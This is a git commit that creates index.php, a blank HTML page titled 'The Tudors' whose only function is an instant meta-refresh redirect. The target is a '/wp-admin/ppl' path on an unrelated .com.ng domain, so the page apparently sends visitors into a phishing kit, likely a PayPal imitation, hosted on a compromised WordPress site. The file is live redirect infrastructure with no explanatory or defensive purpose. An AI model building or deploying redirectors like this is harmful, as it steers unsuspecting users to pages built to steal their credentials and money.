8976b964a9e2fe78831d12f6401afa0bd6fb4738
luqmjpro <73815937+luqmjpro@users.noreply.github.com>
2020-11-15 10:18:40 -0800

    Create index.php

---
+++ index.php
@@ -0,0 +1,9 @@
+<html xmlns="http://www.w3.org/1999/xhtml">    
+  <head>      
+    <title>The Tudors</title>      
+    <meta http-equiv="refresh" content="0;URL='https://phahaad.com.ng/wp-admin/ppl'" />    
+  </head>    
+  <body> 
+  
+  </body>  
+</html>  
